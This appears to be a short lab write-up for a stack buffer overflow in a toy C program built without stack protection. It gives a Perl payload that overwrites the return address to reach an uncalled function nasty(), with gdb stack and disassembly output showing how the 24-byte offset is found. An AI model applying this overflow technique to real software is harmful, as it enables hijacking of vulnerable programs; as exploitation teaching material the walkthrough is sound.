### Compile 

> gcc oldskool.c -o oldskool -zexecstack -fno-stack-protector -g


> run `perl -e 'print "\x41"x24 . "\x18\x06\x40\x00\x00\x00\x00\x00";'`

>> How to find magic number 24
   * First of all, using gdb -q ./oldskool aaaaaaaa
   * Set the breakpoint at }
   
   ``
    void go(char *data){

        char name[8];
        strcpy(name,data);
        printf("Winner is : %s\n",name);
   >> }

   ``
   * x /40x $rsp
  
   ``
gef➤  x /40x $rsp
0x7fffffffdc20:	0x00000001	0x00000000	0xffffe130	0x00007fff
0x7fffffffdc30:	0x61616161	0x61616161	0x00000000	0x00000000
0x7fffffffdc40:	0xffffdc60	0x00007fff	0x00400616	0x00000000
0x7fffffffdc50:	0xffffdd48	0x00007fff	0x00000000	0x00000002
0x7fffffffdc60:	0x00000000	0x00000000	0xf7a32f45	0x00007fff
0x7fffffffdc70:	0x00000000	0x00000000	0xffffdd48	0x00007fff
0x7fffffffdc80:	0x00000000	0x00000002	0x004005f4	0x00000000
0x7fffffffdc90:	0x00000000	0x00000000	0xef05309b	0x3153f175
0x7fffffffdca0:	0x004004d0	0x00000000	0xffffdd40	0x00007fff
0x7fffffffdcb0:	0x00000000	0x00000000	0x00000000	0x00000000	
   ``

   * Calculate the position between the first "\x61" and the "return code" 0x00400616
   * The return code is located by disass main()
   ``
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:	push   rbp
   0x00000000004005f5 <+1>:	mov    rbp,rsp
   0x00000000004005f8 <+4>:	sub    rsp,0x10
   0x00000000004005fc <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005ff <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400603 <+15>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400607 <+19>:	add    rax,0x8
   0x000000000040060b <+23>:	mov    rax,QWORD PTR [rax]
   0x000000000040060e <+26>:	mov    rdi,rax
   0x0000000000400611 <+29>:	call   0x4005bd <go>
   0x0000000000400616 <+34>:	leave  
   0x0000000000400617 <+35>:	ret  
   ``

* By running GDB command aboved, function "nasty()" can be executed as expected.

* "a little nasty" will be print according to the nasty(), which has not been called in the main().


